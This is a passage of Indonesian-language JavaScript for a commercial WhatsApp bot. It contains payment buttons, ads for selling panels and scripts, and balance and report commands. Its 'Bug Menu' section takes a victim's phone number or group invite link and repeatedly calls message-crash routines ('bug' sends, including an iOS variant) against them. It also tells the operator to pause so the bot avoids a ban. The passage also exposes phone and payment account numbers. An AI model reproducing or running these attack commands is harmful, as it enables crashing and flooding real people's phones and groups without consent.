"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'pulsa': {
if (!isOwner) return onlyOwn()
var teks = `*NOPE PULSA CLICK DIBAWAH✅*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./lib/thumbnail/thumbnail.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.pulsa}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'rekbni': {
if (!isOwner) return onlyOwn()
var teks = `*REKENING BNI CLICK DIBAWAH✅*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./lib/thumbnail/thumbnail.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.rekbni}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'qris': {
if (!isOwner) return onlyOwn()
if (global.qr == false) return m.reply('Payment Hanya Muncul Oleh Owner Saja')
m.reply('Memproses Mengambil QR, Tunggu Sebentar . . .')
let teks = `
*Untuk Pembayaran Melalui QR All Payment, Silahkan Minta Ke Owner Saja*

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
rafatharcode.sendMessage(m.chat, {image: global.qr, caption: teks}, {quoted: m})
}
break

case 'listadp': {
if (!isOwner) return onlyOwn()
if (global.qr == false) return m.reply('Payment Hanya Muncul Oleh Owner Saja')
m.reply('Memproses Mengambil List, Tunggu Sebentar . . .')
let teks = `_OPEN ADMIN PANEL RAM 16 CORE 4_
_ANTI PTPT JIKA MOKAD_
_SERVER FRESH_
_SERVER PRIVATE_

_- ADMIN PANEL_
_- RESELLER PANEL_
_- OWNER PANEL_
_- PT PANEL_
_- PANEL 1-5GB_
_- PANEL UNLIMITED_

HARGA ? PM
PM wa.me/6285864743922
_RafatharCode_`
rafatharcode.sendMessage(m.chat, {image: fs.readFileSync('./lib/thumbnail/listadp.jpg'), caption: teks}, {quoted: m})
}
break

case 'listscv4': {
if (!isOwner) return onlyOwn()
if (global.qr == false) return m.reply('Payment Hanya Muncul Oleh Owner Saja')
m.reply('Memproses Mengambil List, Tunggu Sebentar . . .')
let teks = `*SELL SC RAFATHARCODE PRIBADI V4.0.4 NEW*

*FITUR :*
*- BUY SC OTOMATIS*
*- CEK ID CH VIA BOT*
*- BUY PANEL OTOMATIS*
*- GPTAI WORK*
*- SERVER PANEL 2 SERVER*
*- PLAY MUSIC WORK*
*- INSTALLPANEL ADA V1/V2/V3*
*- RESETPWVPS*
*- BUG MENU GANAS*
*- SUBDOMAIN (DOMAIN) ADA 34*
*- CVPS UBUNTU SAMPE 16GB*
*- CVPS 2 VERSI*
*- TOURL WORK 2 VERSI*
*- SUPPORT CHANNEL WHATSAPP*

*SCRIPT SUDAH UPDATE BAILEYS NO ERROR SIAP RUN !!*
*HARGA ? PM*
PM wa.me/6285864743922
_RafatharCode_`
rafatharcode.sendMessage(m.chat, {image: fs.readFileSync('./lib/thumbnail/listscv4.jpg'), caption: teks}, {quoted: m})
}
break

case 'listtoken': {
if (!isOwner) return onlyOwn()
if (global.qr == false) return m.reply('Payment Hanya Muncul Oleh Owner Saja')
m.reply('Memproses Mengambil List, Tunggu Sebentar . . .')
let teks = `**SELL TOKEN & BASH*

*KEUNTUNGAN :*
*1. BISA INSTALLPANEL*
*2. BISA INSTALL NODE*
*3. BISA RESETPWVPS*
*4. BISA INSTALL THEMA*

*PERMANEN FREE UPDATE*
*HARGA ? PM*
PM wa.me/6285864743922
_RafatharCode_`
rafatharcode.sendMessage(m.chat, {image: fs.readFileSync('./lib/thumbnail/listtoken.jpg'), caption: teks}, {quoted: m})
}
break

case 'tsrvr': {
if (!isOwner) return onlyOwn()
m.reply('_Cpanell Srvr Rafathar Code Ada 2!!_')
}
break

case 'gold': {
m.reply(`*Info gold kamu*
Name: ${db.data.users[m.sender].nama}
Nomor: ${m.sender.split("@")[0]}
Gold: ${cekGold(m.sender, db_gold)}`)
}
break

case 'saldo': {
m.reply(`*Info limit kamu*
Name: ${db.data.users[m.sender].nama}
Nomor: ${m.sender.split("@")[0]}
Saldo: Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}`)
}
break

case 'limit': {
m.reply(`*Info limit kamu*
Name: ${db.data.users[m.sender].nama}
Nomor: ${m.sender.split("@")[0]}
Limit: ${cekLimit(m.sender, db_limit)}`)
}
break

case 'cekgold': {
if (!froms && !m.quoted) return m.reply(`Tag seseorang yang ingin kamu ${command} nya`)
if (cekGold(froms, db_gold) == undefined) return m.reply('Dia gak punya gold sama sekali.')
if (froms == m.sender) return m.reply(`Ketik ${prefix}gold aja`)
let txt = `${monospace("CEK GOLD")}\nNama: ${rafatharcode.getName(froms)}\nGold: ${toRupiah(cekGold(froms, db_gold))}`
m.reply(txt)
}
break

case 'ceksaldo': {
if (!froms && !m.quoted) return m.reply(`Tag seseorang yang ingin kamu ${command} nya`)
if (cekSaldo(froms, db_saldo) == undefined) return m.reply('Dia gak punya saldo sama sekali.')
if (froms == m.sender) return m.reply(`Ketik ${prefix}saldo aja`)
let txt = `${monospace("CEK SALDO")}\nNama: ${rafatharcode.getName(froms)}\nSaldo: ${toRupiah(cekSaldo(froms, db_saldo))}`
m.reply(txt)
}
break

case 'ceklimit': {
if (!froms && !m.quoted) return m.reply(`Tag seseorang yang ingin kamu ${command} nya`)
if (cekLimit(froms, db_limit) == undefined) return m.reply('Dia gak punya limit sama sekali.')
if (froms == m.sender) return m.reply(`Ketik ${prefix}limit aja`)
let txt = `${monospace("CEK LIMIT")}\nNama: ${rafatharcode.getName(froms)}\nLimit: ${toRupiah(cekLimit(froms, db_limit))}`
m.reply(txt)
}
break

case 'tfsaldo': {
if (!isOwner) return onlyOwn()
if (!m.mentionedJid[0] && !m.quoted) return m.reply('Tag/kutip pesan seseorang!')
if (!text) return m.reply(`Contoh: ${prefix+command} 62xx 1000`)
let receiver = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let amount = parseInt(args[1])
let senderSaldo = cekSaldo(m.sender, db_saldo)
if (isNaN(args[1]) || args[1] <= 1000) return m.reply('Minimal tfsaldo: 1.000');
if (senderSaldo < amount) {
return m.reply(`Saldo tidak cukup. Saldo kamu: Rp. ${toRupiah(senderSaldo)}`)
}
minSaldo(m.sender, amount, db_saldo)
addSaldo(receiver, amount, db_saldo)
m.reply(`*TRANSFER SALDO BERHASIL*
- Pengirim: ${m.sender.split('@')[0]}
- Penerima: ${receiver.split('@')[0]}
- Jumlah: Rp. ${toRupiah(amount)}`)
}
break

case 'owner': {
if (!isOwner) return onlyOwn()
await rafatharcode.sendMessage(from, { 
contacts: { 
displayName: `${list.length} kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 99999999, 
isForwarded: true,
mentionedJid: null
}}, {quoted: m})
}
break

case 'owner2': {
if (!isOwner) return onlyOwn()
	await rafatharcode.sendMessage(m.chat, {
		react: {
			text: "⏳",
			key: m.key,
		}
	})
	let img = "https://telegra.ph/file/8f585e6f47a98cf262978.jpg"
	async function image(url) {
		const {
			imageMessage
		} = await generateWAMessageContent({
			image: {
				url
			}
		}, {
			upload: rafatharcode.waUploadToServer
		})
		return imageMessage
	}
	let msg = generateWAMessageFromContent(
		m.chat, {
			viewOnceMessage: {
				message: {
					interactiveMessage: {
						body: {
							text: (`HAI KAK ${pushname}\nINI OWNER KU YAA JNGAN DI SPAM`)
						},
						carouselMessage: {
							cards: [{
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: `*MY OWNER RAFATHARCODE*`
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"👤 OWNER","url":"https:\\/\\/wa.me\\/6285864743922?text=Halo+owner","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: `> *CHANEL RAFATHARCODE*`
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"👥 SALURAN ADMIN","url":"https://whatsapp.com/channel/0029Vajny6c4tRs0qnwveJ0s","merchant_url":"https://www.google.com"}',
									}, ],
								},
							}, ],
							messageVersion: 1,
						},
					},
				},
			},
		}, {});
	await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
		messageId: msg.key.id,
	});
}
break

case 'ping': case 'tes': {

if (!isOwner) return onlyOwn()
const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB"
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `*乂 INFO SERVER*
• OS: *${tio}*
• IP Address: *${nou.os.ip()}*
• Type OS: *${nou.os.type()}*
• Cpu : *${os.cpus().length} Core, ${os.cpus()[0].model}*

*乂 UPTIME*
• Uptime : *${Math.floor(os.uptime() / 86400)} days*
• Runtime : *${runtime(process.uptime())}*

*乂 RAM*
• Total: *${formatp(os.totalmem())}*
• Digunakan: *${formatp(os.totalmem() - os.freemem())}*

*乂 PENYIMPANAN*
• Total: *${tot.totalGb} GB*
• Digunakan: *${tot.usedGb} GB > ${tot.usedPercentage}%*
• Tersedia: *${tot.freeGb} GB > ${tot.freePercentage}%*

*乂 INFORMASI DALAM*
• Profil: *${db.data.users[m.sender].daftar ? 'Sudah terdaftar' : 'Belum terdaftar'}*
• Total fitur: *${totalFitur()}*
• Total user: *${Object.values(db.data.users).length} Users*
• Status:  *${isOwner ? 'Owner' : isPremium ? 'Premium' : isReseller ? 'Reseller' : isReseller2 ? 'Reseller2' : isOwner2 ? 'Owner2' : 'User'}*

*乂 PING*
• Ping: *${latensi.toFixed(4)} detik*`
rafatharcode.sendMessage(m.chat, {text: respon }, {quoted: ftext})
}
break

case 'ceksrvr': {

if (!isOwner) return onlyOwn()
const old = performance.now()
const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB"
const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB"
const serverInfo = `
*🔴 INFORMASI SERVER BOT RAFATHARCODE*

🖥 CPU : *${os.cpus().length} Core, ${os.cpus()[0].model}*
🕡 Uptime : *${Math.floor(os.uptime() / 86400)} days*
🕡 Runtime : *${runtime(process.uptime())}*
💾 Ram : *${free_ram}/${ram}*
⚡ Speed : *${(performance.now() - old).toFixed(5)} ms*
`
rafatharcode.sendText(m.chat, serverInfo, m)
}
break

case 'runtime': {

if (!isOwner) return onlyOwn()
m.reply(`Bot runtime: ${runtime(process.uptime())}`)
}
break

case 'updatesc': {
let teks = `*UPDATE SCRIPT RAFATHARCODE V3*

*DI UPDATE SEJAK :*
*${penghitung}🥵*
*PUKUL :*
*${jam}🥵*

*UPDATE SCRIPT TIDAK MENENTU!*`
rafatharcodereply(teks)
}
break

case 'payment': {

if (!isOwner) return onlyOwn()
let teksnya = `
Silahkan Pilih Payment Pembayaran Yang Tersedia Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Payment", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${ownername}\", "rows": [{ "header": "Dana", "title": "Dana Payment", "id": ".dana" }, 
{ "header": "Ovo", "title": "Ovo Payment", "id": ".ovo" }, 
{ "header": "Gopay", "title": "Gopay Payment", "id": ".gopay" }, 
{ "header": "Pulsa", "title": "Pulsa Payment", "id": ".pulsa" }, 
{ "header": "Rekening Bni", "title": "Rekening Bni Payment", "id": ".rekbni" }, 
{ "header": "QR", "title": "QR Payment", "id": ".qris" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'pay': case 'sendpay': {
if (!isOwner) return onlyOwn()
const urldana = "https://telegra.ph/file/ef4f3af7ab5e2f914863a.jpg"
const urlgopay = "https://telegra.ph/file/ef4f3af7ab5e2f914863a.jpg"
const urlovo = "https://telegra.ph/file/ef4f3af7ab5e2f914863a.jpg"
const urlqr = "https://telegra.ph/file/ef4f3af7ab5e2f914863a.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: rafatharcode.waUploadToServer
  })
  return imageMessage
}


    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {},
              carouselMessage: {
                cards: [
                  {
                    header: {
                      imageMessage: await image(urldana),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT DANA RAFATHAR CODE` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"083862780942\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urlgopay),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT GOPAY RAFATHAR CODE` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"083183432282\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urlovo),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT OVO RAFATHAR CODE` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"083835382126\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urlqr),
                      hasMediaAttachment: true,
                    },
                    body: { text: `QR ALLPAY RAFATHAR CODE` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (RafatharCode)","url":"https:\\/\\/wa.me\\/6285864743922","webview_presentation":null}',
                        },
                      ],
                    },
                  },

                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      {}
    );

    await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
            }
break

case 'totalfeature':
case 'totalfitur': 
case 'ttlftr': {
if (!isOwner) return onlyOwn()
m.reply(`${monospace("TOTAL FITUR")}\nTotal: ${totalFitur()}`)
}
break

case 'request':
case 'saran': {
if (!text) return m.reply('Berikan penjelasan, apa yang ingin kamu sarankan.');
let senderNumber = m.sender.split("@")[0];
let requestId = Date.now().toString(); 
permintaan[requestId] = {
sender: senderNumber,
text: text,
timestamp: new Date(),
status: 'Dibuat'
};
rafatharcode.sendMessage(owner + "@s.whatsapp.net", {text: `*Permintaan dari user*\nID: ${requestId}\nNomor: ${senderNumber}\nTeks: ${text}`}, {quoted: fkontak});
await m.reply('Permintaan berhasil terkirim!');
}
break;

case 'cekrequest':
case 'ceksaran': {
let requestId = text.trim();
if (!permintaan[requestId]) return m.reply('ID permintaan tidak ditemukan atau permintaan sudah tidak valid.');
let request = permintaan[requestId];
let permintaanText = `Detail Permintaan:\n\nID: ${requestId}\nNomor: ${request.sender}\nTeks: ${request.text}\nWaktu: ${request.timestamp}\nStatus: ${request.status}`;
m.reply(permintaanText);
}
break;

case 'lapor':
case 'report': {
if (!text) return m.reply('Berikan penjelasan, bug apa yang kamu temui');
let senderNumber = m.sender.split("@")[0];
let reportId = Date.now().toString(); 
laporan[reportId] = {
sender: senderNumber,
text: text,
timestamp: new Date(),
status: 'Dibuat'
};
rafatharcode.sendMessage(owner + "@s.whatsapp.net", {text: `*Laporan dari user*\nID: ${reportId}\nNomor: ${senderNumber}\nTeks: ${text}`}, {quoted: fkontak})
await m.reply('Laporan berhasil terkirim!')
}
break

case 'balas':
case 'reply': {
let args = text.split(' ')
let reportId = args[0]
let replyText = args.slice(1).join(' ')
if (!laporan[reportId]) return m.reply('ID laporan tidak ditemukan atau laporan sudah tidak valid.')
let recipient = laporan[reportId].sender + '@s.whatsapp.net'
rafatharcode.sendMessage(recipient, {text: `Balasan dari pemilik bot:\n${replyText}`}, {quoted: fkontak})
await m.reply('Balasan terkirim!')
delete laporan[reportId]
rafatharcode.sendMessage(owner + "@s.whatsapp.net", {text: `Balasan terkirim ke user dengan ID laporan: ${reportId} dan laporan telah dihapus dari database.`}, {quoted: fkontak})
}
break

case 'laporan':
case 'reports': {
let laporanText = 'Laporan yang belum dibalas:\n\n'
for (let id in laporan) {
if (laporan[id].status === 'Dibuat') {
laporanText += `ID: ${id}\nNomor: ${laporan[id].sender}\nTeks: ${laporan[id].text}\nWaktu: ${laporan[id].timestamp}\n\n`
}}
m.reply(laporanText)
}
break

case 'hapuslaporan':
case 'delreports': {
let reportId = text.trim();
if (!laporan[reportId]) return m.reply('ID laporan tidak ditemukan atau laporan sudah tidak valid.')
delete laporan[reportId]
m.reply('Laporan berhasil dihapus!')
}
break

case 'ceklaporan':
case 'cekreports': {
let reportId = text.trim();
if (!laporan[reportId]) return m.reply('ID laporan tidak ditemukan atau laporan sudah tidak valid.')
let report = laporan[reportId]
let laporanText = `Detail Laporan:\n\nID: ${reportId}\nNomor: ${report.sender}\nTeks: ${report.text}\nWaktu: ${report.timestamp}\nStatus: ${report.status}`
m.reply(laporanText)
}
break
// === Bug Menu


case 'rafa-pc': case 'amalia-pc': case 'alfixamalia-pc': {
if (!isOwner) return onlyOwn()
if (!isPc) return onlyPrivat()

jumlah = 20
sendArifinlazMessages(from, jumlah)
await sleep(2000)
rafatharcodereply(`<✓> Successfully Send Bug✅\n\n<!>Pause 2 minutes so that the bot is not banned.`)
}
break

case 'rip-pc': case 'ripper-pc': case 'php-pc': {
if (!isOwner) return onlyOwn()
if (!isPc) return onlyPrivat()

jumlah = 20
sendArifinlazMessages(from, jumlah)
await sleep(2000)
rafatharcodereply(`<✓> Successfully Send Bug✅\n\n<!>Pause 2 minutes so that the bot is not banned.`)
}
break

case 'sipilist': case '1hit': case 'mimir': case '1shoot': case 'rafasystem': case 'systemc1': {
if (!isOwner && !isPremium) return onlyOwn();
if (!q) return rafatharcodereply(`Penggunaan .${command} 6283183432282`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return rafatharcodereply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await rafatharcodereply('_Tunggu Sebentar Sedang Mengirim..._')
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await rafatharcodereply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.\n\nBug By RiiSTORE ID😈`)
}
break
case 'rafa1hit': case 'amalia1hit': case 'syva1hit': case 'rafa1shoot': case 'amalia1shoot': {
if (!isOwner && !isPremium) return onlyOwn();
if (!q) return rafatharcodereply(`Penggunaan .${command} 6283183432282`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return rafatharcodereply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await rafatharcodereply('_Tunggu Sebentar Sedang Mengirim..._')
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await rafatharcodereply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.\n\nBug By RiiSTORE ID😈`)
}
break
case '😈': case '😎': case '🥵': case '🌷': case '☠️': case '🥶': {
if (!isOwner && !isPremium) return onlyOwn();
if (!q) return rafatharcodereply(`Penggunaan .${command} 6283183432282`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return rafatharcodereply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await rafatharcodereply('_Tunggu Sebentar Sedang Mengirim..._')
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await rafatharcodereply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.\n\nBug By RiiSTORE ID😈`)
}
break
case '😱': case '😡': case '🤢': case '💀': case '👻': case '💩': {
if (!isOwner && !isPremium) return onlyOwn();
if (!q) return rafatharcodereply(`Penggunaan .${command} 6283183432282`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return rafatharcodereply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await rafatharcodereply('_Tunggu Sebentar Sedang Mengirim..._')
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await rafatharcodereply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.\n\nBug By RiiSTORE ID😈`)
}
break
case 'rafagas': case 'rafaslebew': case 'rbantairipper': case 'amaliacakep': {
if (!isOwner && !isPremium) return onlyOwn();
if (!q) return rafatharcodereply(`Penggunaan .${command} 6283183432282|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return rafatharcodereply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
rafatharcodereply(ppk + " detik");
rafatharcodereply('_Tunggu Sebentar Sedang Mengirim..._')
for (let j = 0; j < jumlah; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await aipong(target)
await sleep(1500)
}
rafatharcodereply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
case 'bug-ios': case 'bug-ipong': {
if (!isOwner && !isPremium) return onlyOwn();
if (!q) return rafatharcodereply(`Penggunaan .${command} 6283183432282|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return rafatharcodereply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
rafatharcodereply(ppk + " detik");
rafatharcodereply('_Tunggu Sebentar Sedang Mengirim..._')
for (let j = 0; j < jumlah; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await aipong(target)
await sleep(1500)
}
rafatharcodereply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
case 'rafabuggc': case 'rafagc': case 'rafaspmgc': {
if (!isOwner && !isPremium) return onlyOwn();
if (!q) return rafatharcodereply(`Penggunaan .${command} https://chat.whatsapp.com/`)
await rafatharcodereply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let Pe = await rafatharcode.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
rafatharcode.sendMessage(Pe, {text: '𝙍𝙖𝙛𝙖𝙩𝙝𝙖𝙧𝘾𝙤𝙙𝙚444 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𓅋'}, {quoted:m})
rafatharcode.sendMessage(Pe, {text: '𝙍𝙖𝙛𝙖𝙩𝙝𝙖𝙧𝘾𝙤𝙙𝙚444 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𓅋'}, {quoted:m})
rafatharcode.sendMessage(Pe, {text: '𝙍𝙖𝙛𝙖𝙩𝙝𝙖𝙧𝘾𝙤𝙙𝙚444 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𓅋'}, {quoted:m})
rafatharcode.sendMessage(Pe, {text: '𝙍𝙖𝙛𝙖𝙩𝙝𝙖𝙧𝘾𝙤𝙙𝙚444 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𓅋'}, {quoted:m})
await baklis(Pe, ryobug)
